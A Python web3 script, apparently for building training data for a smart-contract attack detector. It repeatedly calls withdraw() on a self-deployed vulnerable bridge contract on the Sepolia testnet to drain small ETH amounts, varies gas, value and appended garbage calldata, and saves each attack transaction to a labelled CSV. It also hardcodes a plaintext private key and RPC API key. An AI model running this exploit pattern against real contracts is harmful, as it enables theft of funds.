from web3 import Web3
import pandas as pd
import time
import sys
import random 

# --- CONFIGURATION ---
RPC_URL = "https://ethereum-sepolia.core.chainstack.com/3947f6864fca9eb65d71d4ff33e45528" 
PRIVATE_KEY = "a5e59cb365a3324dd115640f1aaa6b13f0d5f503a530230e70115617a6e3c8a6" # The "Attacker's" Key
BRIDGE_ADDRESS = "0xF9A35F83f5AF77bDB7319529822d2c14B72377FF" # address of the VulnerableBridge we deployed
# ---------------------

# 1. The ABI (Standard definition for the VulnerableBridge)
# We need this so Python knows how to talk to your contract.
ABI_OF_BRIDGE = [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"anonymous": False,
		"inputs": [
			{
				"indexed": True,
				"internalType": "address",
				"name": "sender",
				"type": "address"
			},
			{
				"indexed": False,
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "BridgeDeposit",
		"type": "event"
	},
	{
		"anonymous": False,
		"inputs": [
			{
				"indexed": True,
				"internalType": "address",
				"name": "receiver",
				"type": "address"
			},
			{
				"indexed": False,
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "BridgeWithdraw",
		"type": "event"
	},
	{
		"inputs": [],
		"name": "balance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "deposit",
		"outputs": [],
		"stateMutability": "payable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "owner",
		"outputs": [
			{
				"internalType": "address",
				"name": "",
				"type": "address"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			},
			{
				"internalType": "address",
				"name": "recipient",
				"type": "address"
			}
		],
		"name": "withdraw",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]

def attack_bridge():
    print("------------------------------------------------")
    print("🚀 STARTING ATTACK SCRIPT")
    print("------------------------------------------------")

    # 2. Connect to Blockchain
    try:
        w3 = Web3(Web3.HTTPProvider(RPC_URL))
        if not w3.is_connected():
            print("❌ Error: Could not connect to Sepolia. Check your RPC_URL.")
            return
        print(f"✅ Connected to Sepolia! Block Number: {w3.eth.block_number}")
    except Exception as e:
        print(f"❌ Connection Error: {e}")
        return

    # 3. Setup Account
    try:
        account = w3.eth.account.from_key(PRIVATE_KEY)
        print(f"🏴‍☠️  Attacker Address: {account.address}")
        
        balance = w3.eth.get_balance(account.address)
        print(f"💰 Attacker Balance: {w3.from_wei(balance, 'ether')} ETH")
        
        if balance == 0:
             print("❌ Error: Your wallet has 0 ETH. You need gas money to hack!")
             return
    except Exception as e:
        print(f"❌ Account Error: Check your PRIVATE_KEY. Details: {e}")
        return

    # 4. Setup Contract
    contract = w3.eth.contract(address=BRIDGE_ADDRESS, abi=ABI_OF_BRIDGE)
    hacked_data_rows = []
    
    # 5. Run Attacks
    print("\n⚔️  Launching 10 VARIANT Attacks (Better Data)...")
    
    for i in range(10):
        print(f"\n--- Attack {i+1} / 10 ---")
        try:
            # 1. Randomize Amount to Steal
            # Steal between 0.00001 and 0.0002 ETH
            amount_float = random.uniform(0.00001, 0.0002) 
            amount_to_steal = w3.to_wei(amount_float, 'ether')
            
            # 2. Randomize Gas Limit
            # Hackers often overestimate gas. We simulate ranges between 200k and 500k.
            # This prevents the model from memorizing "300000".
            random_gas_limit = random.randint(200000, 500000)

            # 3. Randomize Value Sent (The "Dust" Attack)
            # Sometimes hackers send 1 wei just to trigger different logic.
            random_value = 0
            if random.random() > 0.7: # 30% chance to send dust
                random_value = w3.to_wei(0.0000001, 'ether')

            # 4. Build the Transaction
            tx = contract.functions.withdraw(
                amount_to_steal,
                account.address
            ).build_transaction({
                'from': account.address,
                'nonce': w3.eth.get_transaction_count(account.address),
                'gas': random_gas_limit, 
                'gasPrice': w3.eth.gas_price,
                'value': random_value
            })
            
            # 5. Add Random "Garbage" Data (To vary Input Length)
            # This mimics different exploit payloads or different compiler versions.
            # We append random hex strings to the data.
            garbage_len = random.randint(0, 64) # 0 to 32 bytes of trash
            garbage_data = random.randbytes(garbage_len).hex()
            tx['data'] = tx['data'] + garbage_data

            print(f"   - Gas Limit: {random_gas_limit}")
            print(f"   - Stealing: {amount_float:.5f} ETH")
            print(f"   - Added Garbage Bytes: {garbage_len}")

            # 6. Sign and Send
            signed_tx = w3.eth.account.sign_transaction(tx, private_key=PRIVATE_KEY)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            
            # Wait for receipt...
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            # 7. Capture Data (Same as before)
            input_data = tx['data']
            # Note: We must calculate length based on the NEW modified data
            input_len = (len(input_data) - 2) / 2 
            
            row = {
                'tx_hash': receipt['transactionHash'].hex(),
                'block': receipt['blockNumber'],
                'timestamp': int(time.time()),
                'from_address': account.address,
                'to_address': BRIDGE_ADDRESS,
                'value': random_value, 
                'gas_limit': tx['gas'],
                'gas_used': receipt['gasUsed'],
                'gas_ratio': receipt['gasUsed'] / tx['gas'],
                'nonce': tx['nonce'],
                'method': 'withdraw',
                'input_length': input_len,
                'status': 1 if receipt['status'] == 1 else 0,
                'label': 1
            }
            hacked_data_rows.append(row)
            print("✅ Attack Logged.")
            
        except Exception as e:
            print(f"❌ Attack Failed: {e}")
            time.sleep(2)

    # 6. Save to CSV
    if len(hacked_data_rows) > 0:
        df = pd.DataFrame(hacked_data_rows)
        df.to_csv("training_data_hacks.csv", index=False)
        print("\n✅ DONE! Saved 'training_data_hacks.csv'")
    else:
        print("\n❌ No data collected. Check errors above.")

# --- THIS WAS MISSING IN YOUR SCRIPT ---
if __name__ == "__main__":
    attack_bridge()